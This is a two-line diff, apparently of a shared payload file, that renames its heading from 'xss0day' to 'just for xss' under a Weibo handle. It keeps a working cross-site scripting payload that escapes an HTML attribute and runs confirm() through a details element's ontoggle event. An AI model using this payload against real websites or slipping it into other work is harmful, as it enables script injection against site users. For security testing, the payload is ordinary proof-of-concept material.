@@ -1,2 +1,2 @@
-# xss0day - weibo@flagellantX
+# just for xss - weibo@flagellantX
 ">'><details/open/ontoggle=confirm('flagellantX')>
